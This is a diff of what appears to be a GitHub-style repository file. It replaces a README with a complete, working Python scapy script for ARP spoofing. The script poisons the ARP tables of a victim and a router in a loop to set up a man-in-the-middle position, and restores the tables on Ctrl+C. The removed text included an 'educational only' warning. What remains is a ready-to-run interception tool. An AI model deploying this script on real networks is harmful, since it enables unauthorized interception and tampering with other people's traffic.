@@ -1,58 +1,70 @@
-ARP Spoofer (Man-in-the-Middle Attack)
-This Python script performs ARP spoofing (Man-in-the-Middle attack) to intercept network traffic between a victim and a router. The attacker positions themselves between the two devices and can intercept, modify, or block the traffic between them.
+#!/usr/bin/env python3
+# ---------------------------------------------
+# Title: ARP Spoofer (Man-in-the-Middle)
+# Author: [Your Name]
+# Description: Performs ARP spoofing to position
+# attacker between target and gateway (MITM attack)
+# Tested on: Kali Linux
+# ---------------------------------------------
 
-Features
-ARP Spoofing: Pretend to be the gateway to the victim and vice versa.
+import scapy.all as scapy
+import time
+import sys
 
-Real-time packet counting: Keeps track of the number of spoofed packets sent.
+# 🧠 CONFIGURATION - Set the target interface (e.g., eth0, wlan0, eth1)
+interface = "eth1"
 
-Automatic ARP table restoration: Ensures that the original ARP tables are restored upon script interruption (Ctrl+C).
+# 🔍 Function to get MAC address of a given IP
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)  # Create ARP request
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast MAC
+    arp_request_broadcast = broadcast / arp_request  # Combine packets
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, iface=interface, verbose=False)[0]
 
-Requirements
-Python 3.x
+    if answered_list:
+        return answered_list[0][1].hwsrc  # Return MAC of response
+    else:
+        return None
 
-scapy library
+# 🎯 Function to spoof ARP replies (pretend to be gateway to victim and vice versa)
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    if target_mac:
+        # Craft ARP reply: "I am the spoof_ip"
+        arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+        ether_packet = scapy.Ether(dst=target_mac)
+        full_packet = ether_packet / arp_packet
+        scapy.send(full_packet, iface=interface, verbose=False)  # Send spoofed ARP packet
 
-To install the required library, use the following command:
+# 🛠️ Function to restore ARP tables to original state
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    if destination_mac and source_mac:
+        # Send correct ARP reply to restore actual IP-MAC mapping
+        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
+                           psrc=source_ip, hwsrc=source_mac)
+        ether = scapy.Ether(dst=destination_mac)
+        full_packet = ether / packet
+        scapy.send(full_packet, count=4, iface=interface, verbose=False)
 
-bash
-Copy
-Edit
-pip install scapy
-How to Use
-Identify the IP addresses:
+# 🧠 Set your victim and gateway IPs here
+target_ip = "<TARGET_IP>"    # Replace <TARGET_IP> with the victim's IP address
+gateway_ip = "<GATEWAY_IP>"  # Replace <GATEWAY_IP> with your router's IP address
 
-Target IP (Victim): The device you want to intercept traffic from (e.g., a computer or smartphone).
+# 🚀 Start spoofing loop
+try:
+    packet_sent_count = 0
+    while True:
+        spoof(target_ip, gateway_ip)  # Tell victim: "I am gateway"
+        spoof(gateway_ip, target_ip)  # Tell router: "I am victim"
+        packet_sent_count += 2
+        print("\r[+] Sent " + str(packet_sent_count), end="")  # Real-time update
+        sys.stdout.flush()
+        time.sleep(2)  # Wait before sending again (avoid flooding too hard)
 
-Gateway IP (Router): The router or gateway device that connects the local network to the internet.
-
-You can find these IP addresses using the following steps:
-
-Find Target IP (Victim):
-
-If you're on Linux or macOS, open the terminal and use ip a to check the IP addresses of devices on your network.
-
-If you're on Windows, use ipconfig in the command prompt.
-
-Find Gateway IP (Router):
-
-On Linux or macOS, run ip route | grep default or netstat -nr | grep default.
-
-On Windows, run ipconfig and look for the "Default Gateway" section.
-
-Set the IPs in the script: In the script, set the following variables:
-
-python
-target_ip = "192.168.1.x"   # Replace with the victim's IP
-gateway_ip = "192.168.1.x"  # Replace with your router's IP
-Run the script:
-
-bash
-sudo python3 arp_spoof.py
-
-This will start the ARP spoofing process, and you'll see real-time packet counts.
-
-Stop the script: Press CTRL + C to stop the script. The ARP tables will be restored automatically.
-
-Warning
-This script is intended for educational purposes only. Unauthorized use of ARP spoofing can be illegal and unethical. Always get permission before testing on any network.
+# 🛑 On Ctrl+C - Restore the network
+except KeyboardInterrupt:
+    print("\n[-] Detected CTRL + C ... Resetting ARP tables. Please wait...\n")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
